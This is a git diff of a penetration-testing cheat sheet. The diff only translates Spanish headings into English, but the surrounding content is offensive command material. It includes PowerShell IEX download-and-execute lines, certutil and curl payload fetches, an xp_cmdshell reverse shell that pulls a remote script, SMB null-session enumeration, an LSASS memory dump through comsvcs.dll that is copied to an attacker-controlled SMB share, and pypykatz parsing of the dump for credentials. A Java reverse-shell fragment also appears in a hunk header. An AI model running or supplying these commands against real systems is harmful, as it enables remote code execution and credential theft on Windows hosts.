@@ -756,9 +756,9 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 # Windows
 
-## Comandos útiles
+## Usefull commands
 
-Descargar binarios
+Download Binaries
 ```
 powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binary.ext')
 ```
@@ -769,7 +769,7 @@ curl "http://IP/binario" -o binario
 certutil -urlcache -f http://IP:PORT/binary.ext binary.ext
 ```
 
-Buscar archivo
+Search a file
 ```
 Get-Childitem C:\ -Include nombre_archivo -File -Recurse -erroraction 'silentlycontinue'
 ```
@@ -809,7 +809,7 @@ Listing with Null Session
 ```
 smbclient -L IP -N
 ```
-Enumeracion de directorios con usuario
+Directory listing with an existing user
 ```
 smbclient \\\\IP\\directorio -U 'username%password'
 ```
@@ -840,7 +840,7 @@ Reverse Shell
 EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://IP:PORT/binary.ext") | powershell -noprofile'
 ```
 
-Comandos útiles 
+Usefull commands
 
 [Hacktricks MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
 
@@ -938,19 +938,19 @@ Obtener el ID del proceso
 ```
 (Get-Process lsass).id
 ```
-Dumpear el LSASS
+Dump LSASS
 ```
 rundll32 C:\Windows\System32\comsvcs.dll, MiniDump ID_del_Proceso lsass.dmp full
 ```
-Levantar un servidor SMB
+Create an SMB Server
 ```
 impacket-smbserver smbFolder $(pwd) -smb2support
 ```
-Copiar el lsass en el servidor SMB
+Copy the LSASS on the attacker machine
 ```
 cp lsass.dump \\IP_ATACANTE\smbFolder\lsass.dmp
 ```
-Parsear el lsass.dmp
+Pars the lsass.dmp
 ```
 pypykatz lsa minidump lsass.dmp
 ```
